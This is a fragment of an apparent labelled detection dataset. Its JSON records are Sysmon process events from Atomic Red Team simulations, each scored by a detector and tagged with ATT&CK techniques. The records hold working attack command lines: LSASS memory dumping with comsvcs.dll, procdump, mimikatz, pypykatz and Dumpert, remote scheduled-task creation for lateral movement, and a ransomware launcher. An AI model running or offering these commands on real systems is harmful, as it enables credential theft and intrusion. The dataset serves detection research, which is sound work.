+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.357,
+   "tier": "REVIEW",
+   "exe": "powershell.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\windowspowershell\\v1.0\\powershell.exe\" & {c:\\windows\\system32\\rundll32.exe c:\\windows\\system32\\comsvcs.dll, minidump (get-process lsass).id $env:temp\\lsass-comsvcs.dmp full} ",
+   "launched_via": [
+    "powershell.exe",
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    },
+    {
+     "id": "T1218.011",
+     "name": "Rundll32 proxy execution",
+     "tactic": "Defense Evasion"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{D28789B6-7CDF-5FA1-2501-000000008801}",
+   "parent": "{D28789B6-7CDE-5FA1-2101-000000008801}",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.881,
+   "tier": "HIGH",
+   "exe": "rundll32.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\rundll32.exe\" c:\\windows\\system32\\comsvcs.dll minidump 868 c:\\users\\admini~1\\appdata\\local\\temp\\lsass-comsvcs.dmp full",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    },
+    {
+     "id": "T1218.011",
+     "name": "Rundll32 proxy execution",
+     "tactic": "Defense Evasion"
+    }
+   ],
+   "actions": [
+    "file created -> c:\\users\\admini~1\\appdata\\local\\temp\\lsass-comsvcs.dmp"
+   ],
+   "real_label": 1
+  },
+  {
+   "guid": "{D28789B6-7CDF-5FA1-2601-000000008801}",
+   "parent": "",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.977,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"c:\\atomicredteam\\atomics\\t1003.001\\bin\\outflank-dumpert.exe\" ",
+   "launched_via": [
+    "powershell.exe",
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{D28789B6-7CDF-5FA1-2701-000000008801}",
+   "parent": "{D28789B6-7CDF-5FA1-2601-000000008801}",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.943,
+   "tier": "HIGH",
+   "exe": "outflank-dumpert.exe",
+   "count": 1,
+   "cmd": "c:\\atomicredteam\\atomics\\t1003.001\\bin\\outflank-dumpert.exe  ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [
+    "file created -> c:\\windows\\temp\\dumpert.dmp"
+   ],
+   "real_label": 1
+  },
+  {
+   "guid": "{D28789B6-7CDF-5FA1-2801-000000008801}",
+   "parent": "",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.437,
+   "tier": "REVIEW",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"c:\\atomicredteam\\atomics\\t1003.001\\bin\\mimikatz.exe \"sekurlsa::minidump %%tmp%%\\lsass.dmp\" \"sekurlsa::logonpasswords full\" exit\" ",
+   "launched_via": [
+    "powershell.exe",
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{D28789B6-7CDF-5FA1-2A01-000000008801}",
+   "parent": "",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.983,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"pypykatz live lsa\" ",
+   "launched_via": [
+    "powershell.exe",
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{D28789B6-7CE2-5FA1-4F01-000000008801}",
+   "parent": "",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.97,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"del \"%%temp%%\\wce-output.txt\" >nul 2>&1\" ",
+   "launched_via": [
+    "powershell.exe",
+    "powershell.exe"
+   ],
+   "attack_tags": [],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{D28789B6-7CE3-5FA1-5501-000000008801}",
+   "parent": "",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.983,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"del c:\\windows\\temp\\dumpert.dmp >nul 2> nul\" ",
+   "launched_via": [
+    "powershell.exe",
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{29E67E80-D475-601A-4730-00000000A301}",
+   "parent": "",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.947,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 1,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"c:\\atomicredteam\\atomics\\t1003.001\\bin\\procdump.exe -accepteula -ma lsass.exe c:\\windows\\temp\\lsass_dump.dmp\" ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{29E67E80-D475-601A-4830-00000000A301}",
+   "parent": "{29E67E80-D475-601A-4730-00000000A301}",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.917,
+   "tier": "HIGH",
+   "exe": "procdump.exe",
+   "count": 1,
+   "cmd": "c:\\atomicredteam\\atomics\\t1003.001\\bin\\procdump.exe  -accepteula -ma lsass.exe c:\\windows\\temp\\lsass_dump.dmp ",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [
+    "file created -> c:\\atomicredteam\\atomics\\t1003.001\\bin\\procdump64.exe",
+    "registry set -> hku\\s-1-5-21-1645871015-3279536928-3104981001-500\\software\\sysinternal"
+   ],
+   "real_label": 1
+  },
+  {
+   "guid": "{29E67E80-D475-601A-4930-00000000A301}",
+   "parent": "{29E67E80-D475-601A-4830-00000000A301}",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.313,
+   "tier": "REVIEW",
+   "exe": "procdump64.exe",
+   "count": 1,
+   "cmd": "c:\\atomicredteam\\atomics\\t1003.001\\bin\\procdump.exe  -accepteula -ma lsass.exe c:\\windows\\temp\\lsass_dump.dmp ",
+   "launched_via": [
+    "procdump.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [
+    "file created -> c:\\windows\\temp\\lsass_dump.dmp",
+    "registry set -> hku\\s-1-5-21-1645871015-3279536928-3104981001-500\\software\\sysinternal"
+   ],
+   "real_label": 1
+  },
+  {
+   "guid": "{29E67E80-D47C-601A-4C30-00000000A301}",
+   "parent": "",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.983,
+   "tier": "HIGH",
+   "exe": "cmd.exe",
+   "count": 3,
+   "cmd": "\"c:\\windows\\system32\\cmd.exe\" /c \"del \"c:\\windows\\temp\\lsass_dump.dmp\" >nul 2> nul\" ",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{29E67E80-D482-601A-4D30-00000000A301}",
+   "parent": "",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.917,
+   "tier": "HIGH",
+   "exe": "notprocdump.exe",
+   "count": 1,
+   "cmd": "\"c:\\atomicredteam\\atomics\\t1003.001\\bin\\notprocdump.exe\" -accepteula -ma lsass.exe c:\\windows\\temp\\lsass_dump.dmp",
+   "launched_via": [
+    "powershell.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [
+    "file created -> c:\\atomicredteam\\atomics\\t1003.001\\bin\\notprocdump64.exe",
+    "registry set -> hku\\s-1-5-21-1645871015-3279536928-3104981001-500\\software\\sysinternal"
+   ],
+   "real_label": 1
+  },
+  {
+   "guid": "{29E67E80-D482-601A-4E30-00000000A301}",
+   "parent": "{29E67E80-D482-601A-4D30-00000000A301}",
+   "stage": 4,
+   "source": "T1003.001__atomic_red_team__windows-sysmon",
+   "prob": 0.313,
+   "tier": "REVIEW",
+   "exe": "notprocdump64.exe",
+   "count": 1,
+   "cmd": "\"c:\\atomicredteam\\atomics\\t1003.001\\bin\\notprocdump.exe\" -accepteula -ma lsass.exe c:\\windows\\temp\\lsass_dump.dmp",
+   "launched_via": [
+    "notprocdump.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1003",
+     "name": "Credential dumping",
+     "tactic": "Credential Access"
+    }
+   ],
+   "actions": [
+    "file created -> c:\\windows\\temp\\lsass_dump.dmp",
+    "registry set -> hku\\s-1-5-21-1645871015-3279536928-3104981001-500\\software\\sysinternal"
+   ],
+   "real_label": 1
+  },
+  {
+   "guid": "{3BF36828-A11B-618E-DF10-01000000CC01}",
+   "parent": "",
+   "stage": 5,
+   "source": "T1053.005__lateral_movement__windows-sysmon",
+   "prob": 0.917,
+   "tier": "HIGH",
+   "exe": "sc.exe",
+   "count": 1,
+   "cmd": "sc  \\\\10.0.1.15 delete maliciousservice",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1021",
+     "name": "Remote execution on another host",
+     "tactic": "Lateral Movement"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{3BF36828-A172-618E-EA10-01000000CC01}",
+   "parent": "",
+   "stage": 5,
+   "source": "T1053.005__lateral_movement__windows-sysmon",
+   "prob": 0.857,
+   "tier": "HIGH",
+   "exe": "schtasks.exe",
+   "count": 1,
+   "cmd": "schtasks  /s 10.0.1.15 /create /tn eviltask /tr c:\\mete.exe /ru system /sc once /st 00:00",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1053.005",
+     "name": "Scheduled task",
+     "tactic": "Persistence"
+    },
+    {
+     "id": "T1021",
+     "name": "Remote execution on another host",
+     "tactic": "Lateral Movement"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{3BF36828-A177-618E-EB10-01000000CC01}",
+   "parent": "",
+   "stage": 5,
+   "source": "T1053.005__lateral_movement__windows-sysmon",
+   "prob": 0.907,
+   "tier": "HIGH",
+   "exe": "schtasks.exe",
+   "count": 1,
+   "cmd": "schtasks  /s 10.0.1.15 /run /tn eviltask",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1021",
+     "name": "Remote execution on another host",
+     "tactic": "Lateral Movement"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{3BF36828-A17C-618E-EC10-01000000CC01}",
+   "parent": "",
+   "stage": 5,
+   "source": "T1053.005__lateral_movement__windows-sysmon",
+   "prob": 0.937,
+   "tier": "HIGH",
+   "exe": "schtasks.exe",
+   "count": 1,
+   "cmd": "schtasks  /s 10.0.1.15 /delete /tn eviltask /f",
+   "launched_via": [
+    "cmd.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1021",
+     "name": "Remote execution on another host",
+     "tactic": "Lateral Movement"
+    }
+   ],
+   "actions": [],
+   "real_label": 1
+  },
+  {
+   "guid": "{8B6011A9-BE53-6192-F878-05000000F101}",
+   "parent": "",
+   "stage": 6,
+   "source": "T1486__dcrypt__windows-sysmon",
+   "prob": 0.747,
+   "tier": "HIGH",
+   "exe": "dcrypt.tmp",
+   "count": 1,
+   "cmd": "\"c:\\users\\admini~1\\appdata\\local\\temp\\2\\is-rr4d9.tmp\\dcrypt.tmp\" /sl5=\"$2d0144,1206527,119296,c:\\users\\administrator\\downloads\\dcrypt.exe\" ",
+   "launched_via": [
+    "dcrypt.exe"
+   ],
+   "attack_tags": [
+    {
+     "id": "T1486",
+     "name": "Data encrypted for impact",
+     "tactic": "Impact"
+    }
+   ],
+   "actions": [
+    "registry set -> hklm\\software\\microsoft\\windows\\currentversion\\uninstall\\diskcryptor_i"
+   ],
+   "real_label": 1
+  }
+ ]
+}
